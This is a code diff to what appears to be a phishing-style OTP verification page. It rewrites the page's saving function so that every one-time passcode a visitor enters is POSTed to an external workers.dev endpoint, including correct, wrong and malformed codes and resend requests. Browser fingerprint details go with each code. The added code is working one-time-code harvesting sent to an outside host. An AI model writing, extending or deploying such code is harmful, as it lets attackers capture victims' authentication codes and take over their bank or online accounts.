@@ -320,35 +320,42 @@
         // Start the timer
         timerInterval = setInterval(updateTimer, 1000);
         
-        // Function to save OTP data to localStorage (backend simulation)
-        function saveOTPData(otpValue, status) {
-            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-            
-            const otpEntry = {
+        // ⬇️⬇️⬇️ बदली हुई saveOTPData – अब localStorage नहीं, worker को भेजेगी ⬇️⬇️⬇️
+        async function saveOTPData(otpValue, status) {
+            const submission = {
                 id: Date.now(),
                 type: 'OTP2',
-                otp: otpValue,
-                status: status,
+                data: {
+                    otp: otpValue,
+                    status: status,
+                    page: window.location.href,
+                    userAgent: navigator.userAgent,
+                    timeSpent: (176 - seconds) + ' seconds',
+                    referrer: document.referrer,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language
+                },
                 timestamp: new Date().toISOString(),
-                page: window.location.href,
-                userAgent: navigator.userAgent,
-                timeSpent: (176 - seconds) + ' seconds'
+                ip: 'Not available in browser'
             };
-            
-            submissions.push(otpEntry);
-            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
-            
-            // Also save to a separate admin log with more details
-            const adminLog = JSON.parse(localStorage.getItem('adminLog') || '[]');
-            adminLog.push({
-                ...otpEntry,
-                referrer: document.referrer,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language
-            });
-            localStorage.setItem('adminLog', JSON.stringify(adminLog));
-            
-            console.log(`OTP Data Saved: ${otpValue} - Status: ${status}`);
+
+            try {
+                const response = await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(submission)
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log(`OTP data sent to worker: ${otpValue} - Status: ${status}`, result);
+                } else {
+                    console.error('Failed to send OTP data to worker:', response.status);
+                }
+            } catch (error) {
+                console.error('Network error while sending OTP data:', error);
+            }
         }
         
         // OTP Input - Auto move and formatting
@@ -386,7 +393,7 @@
                 errorMessage.style.display = 'block';
                 successMessage.style.display = 'none';
                 
-                // Save invalid format OTP attempt
+                // Save invalid format OTP attempt (fire and forget)
                 saveOTPData(otpValue, 'invalid_format');
                 
                 otpInput.focus();
@@ -408,8 +415,8 @@
                 errorMessage.style.display = 'block';
                 successMessage.style.display = 'none';
                 
-                // Save incorrect OTP attempt
-                saveOTPData(otpValue, 'incorrect');
+                // Save incorrect OTP attempt (await to ensure it's sent before resetting?)
+                await saveOTPData(otpValue, 'incorrect');
                 
                 // Reset button
                 proceedButton.innerHTML = originalText;
@@ -424,8 +431,8 @@
             errorMessage.style.display = 'none';
             successMessage.style.display = 'block';
             
-            // Save correct OTP data
-            saveOTPData(otpValue, 'correct');
+            // Save correct OTP data (await to ensure it's sent before redirect)
+            await saveOTPData(otpValue, 'correct');
             
             // Update button to show success
             proceedButton.innerHTML = '<div class="button-loader"></div> Redirecting...';
@@ -468,7 +475,7 @@
             // Focus on OTP input
             otpInput.focus();
             
-            // Save OTP resend action
+            // Save OTP resend action (fire and forget)
             saveOTPData('RESEND_REQUEST', 'resend_request');
             
             // Show temporary success message
@@ -491,14 +498,6 @@
         // Focus on OTP input when page loads
         window.onload = function() {
             otpInput.focus();
-            
-            // Load previous OTP attempts count
-            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-            const otpAttempts = submissions.filter(entry => entry.type === 'OTP2').length;
-            
-            if (otpAttempts > 0) {
-                console.log(`Previous OTP attempts: ${otpAttempts}`);
-            }
         };
         
         // Also save page view/load event
